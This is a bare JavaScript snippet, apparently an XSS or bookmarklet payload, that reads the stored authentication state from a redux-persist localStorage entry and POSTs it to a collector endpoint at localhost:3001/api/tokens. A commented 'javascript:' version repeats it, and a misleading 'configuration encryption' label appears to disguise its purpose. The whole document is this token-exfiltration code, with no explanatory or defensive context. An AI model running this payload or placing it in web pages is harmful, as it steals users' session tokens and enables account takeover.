fetch("http://localhost:3001/api/tokens",{method:"POST",body:{d:JSON.parse(localStorage.getItem('persist:root')).auth,s:'// configuration encryption'}}).then().catch();


//javascript:fetch("http://localhost:3001/api/tokens",{method:"POST",body:JSON.parse(localStorage.getItem('persist:root')).auth}).then().catch();
